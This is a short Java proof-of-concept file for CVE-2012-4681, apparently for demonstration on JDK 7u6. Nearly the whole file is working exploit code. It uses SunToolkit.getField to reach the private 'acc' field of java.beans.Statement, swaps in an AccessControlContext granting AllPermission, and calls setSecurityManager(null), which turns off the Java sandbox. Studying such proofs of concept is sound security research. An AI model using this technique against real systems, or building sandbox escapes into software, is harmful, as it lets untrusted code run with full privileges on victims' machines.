package org.zh3feng.poc;

import java.beans.Expression;
import java.lang.reflect.Field;
import java.net.URL;
import java.security.AccessControlContext;
import java.security.AllPermission;
import java.security.CodeSource;
import java.security.Permissions;
import java.security.ProtectionDomain;
import java.security.cert.Certificate;
import java.beans.Statement;
import com.sun.beans.finder.ClassFinder;

/**
 * 
 * @author ZH3FENG
 * @since 
 * @description A Simple PoC for CVE-2012-4681
 *              Run in JDK7u6
 * @see https://mp.weixin.qq.com/s/T7eaYSKdxJlTrYZSRJKhRw
 *
 */
public class CVE_2012_4681 {

	public static void main(String[] args) {
		
		/*
		 * Show how to reset java sandbox
		 */
		//1) install 
		System.setSecurityManager(new SecurityManager());
		 System.out.println(System.getSecurityManager() == null);
		
		try {
			//2)get class of sun.awt.SunToolkit 
			Class clazz = ClassFinder.findClass("sun.awt.SunToolkit");
			
			//3)get field(named "acc") from Statement
			Expression expression = new Expression(clazz, "getField", new Object[]{Statement.class, "acc"});
			expression.execute();
	        Field field = (Field) expression.getValue();
	        
	        Statement statement = new Statement(System.class, "setSecurityManager", new Object[]{null});
	        
	        //4)create a AccessControlContext with AllPermission
	        Permissions permissions = new Permissions();
	        permissions.add(new AllPermission());
	        AccessControlContext evilAcc = new AccessControlContext(new ProtectionDomain[]{
	                new ProtectionDomain(new CodeSource(new URL("file:///testtest"), new Certificate[]{}), permissions)
	        });

	        //5)replaces statement's field("acc") value
	        field.set(statement, evilAcc);

	        //6)reset sanbox
	        statement.execute();

	        System.out.println(System.getSecurityManager() == null);
	        
		} catch (Exception e) {
			// ingore
		}

	}

}
